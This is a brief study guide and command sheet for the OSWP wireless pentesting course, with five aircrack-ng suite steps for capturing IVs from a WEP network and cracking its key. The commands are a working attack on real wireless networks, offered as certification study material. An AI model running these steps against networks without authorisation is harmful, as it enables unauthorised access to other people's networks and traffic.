# OSWP-Study-Guide
Study guide and command sheet for Offensive Security PEN-210 course (Offensive Security Wireless Pentester - OSWP)

## WEP (Wired Equivalent Privacy)
WEP is a severely flawed security algorithm for IEEE 802.11 wireless networks. Below are the steps to exploit WEP vulnerabilities:


### Step 1: Kill conflicting processes
```bash
sudo airmon-ng check kill
```
### Step 2: Start monitor mode on wlan0
```bash
sudo airmon-ng start wlan0
```
### Step 3: Scan for WEP networks
sudo airodump-ng wlan0mon --encrypt WEP
```
### Step 4: Capture IVs
```bash
besside-ng -c Channel -b BSSID wlan0mon
```
### Step 5: Crack WEP key
```bash
aircrack-ng ./wep.cap
```
